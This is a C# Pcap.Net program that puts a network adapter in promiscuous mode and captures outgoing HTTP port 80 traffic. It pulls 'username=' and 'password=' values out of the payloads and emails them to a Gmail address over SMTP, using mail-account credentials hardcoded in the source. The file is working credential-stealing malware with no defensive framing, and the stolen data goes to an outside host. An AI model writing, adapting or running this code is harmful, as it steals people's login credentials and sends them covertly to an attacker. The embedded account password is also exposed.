using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using PcapDotNet.Base;
using PcapDotNet.Core;
using PcapDotNet.Packets;
using PcapDotNet.Packets.IpV4;
using PcapDotNet.Packets.Transport;
using System.Net;
using System.IO;
using System.Net.Mail;

namespace ConsoleApplication28
{
    class Program
    {

        public static string LocalIPAddress()
        {
            IPHostEntry host;
            string localIP = "";
            host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (IPAddress ip in host.AddressList)
            {
                if (ip.AddressFamily.ToString() == "InterNetwork")
                {
                    localIP = ip.ToString();
                    break;
                }
            }
            return localIP;
        }

        static void Main(string[] args)
        {
            // Retrieve the device list from the local machine
            IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;

            Console.WriteLine("Your Local Ip Addreas is:" + LocalIPAddress());

            if (allDevices.Count == 0)
            {
                Console.WriteLine("No interfaces found! Make sure WinPcap is installed.");
                return;
            }

            // Print the list
            for (int i = 0; i != allDevices.Count; ++i)
            {
                LivePacketDevice device = allDevices[i];
                Console.Write((i + 1) + ". " + device.Name);
                if (device.Description != null)
                    Console.WriteLine("(" + device.Description + ")");
                else
                    Console.WriteLine(" (No description available)");
            }

            int deviceIndex = 0;
            do
            {
                Console.WriteLine("Enter the interface number (1-" + allDevices.Count + "):");
                string deviceIndexString = Console.ReadLine();
                if (!int.TryParse(deviceIndexString, out deviceIndex) ||
                    deviceIndex < 1 || deviceIndex > allDevices.Count)
                {
                    deviceIndex = 0;
                }
            } while (deviceIndex == 0);

            // Take the selected adapter
            PacketDevice selectedDevice = allDevices[deviceIndex - 1];

            // Open the device
            using (PacketCommunicator communicator = 
                selectedDevice.Open(65536,                                  // portion of the packet to capture
                                                                            // 65536 guarantees that the whole packet will be captured on all the link layers
                                    PacketDeviceOpenAttributes.Promiscuous, // promiscuous mode
                                    1000))                                  // read timeout
            {
                using (BerkeleyPacketFilter filter = communicator.CreateFilter("src " + LocalIPAddress() + " and tcp port 80"))
                {
                    // Set the filter
                    communicator.SetFilter(filter);
                }

                Console.WriteLine("Listening on " + selectedDevice.Description + "...");

                // start the capture
                communicator.ReceivePackets(0, PacketHandler);
            }
        }

        // Callback function invoked by Pcap.Net for every incoming packet
        private static void PacketHandler(Packet packet)
        {
            //Console.WriteLine(packet.Timestamp.ToString("yyyy-MM-dd hh:mm:ss.fff") + " length:" + packet.Length);
            IpV4Datagram ip = packet.Ethernet.IpV4;
            UdpDatagram udp = ip.Udp;
            TcpDatagram tcp = ip.Tcp;
            string content = "";
            // pull the payload 
            if (tcp.IsValid && tcp.PayloadLength > 0)
            {
                Datagram dg = tcp.Payload;
                MemoryStream ms = dg.ToMemoryStream();
                StreamReader sr = new StreamReader(ms);
                content = sr.ReadToEnd();
            }

            // print ip addresses and udp ports
            string s = content;

            if (s.IndexOf("username=") != -1 && s.IndexOf("password=") != -1)
            {
                int userLength = s.IndexOf("&pass") - s.IndexOf("username=");
                string username = s.Substring(s.IndexOf("username="), userLength);
                Console.WriteLine(username);
                int passLength = s.IndexOf("&sub") - s.IndexOf("password=");
                string pass = s.Substring(s.IndexOf("password="), passLength);
                Console.WriteLine(pass);

                string smtp = "smtp.gmail.com";
                string emailaddr = "cybersniffsniff@gmail.com";
                string emailuser = "cybersniffsniff";
                string emailpassword = "cybergal123";

                MailMessage mail = new MailMessage(emailaddr, emailaddr, "Login From:" + LocalIPAddress() , username + "\n" + pass);
                SmtpClient client = new SmtpClient(smtp);
                client.Port = 587;
                client.Credentials = new System.Net.NetworkCredential(emailuser, emailpassword);
                client.EnableSsl = true;
                client.Send(mail);             
            }
        }
    }
}
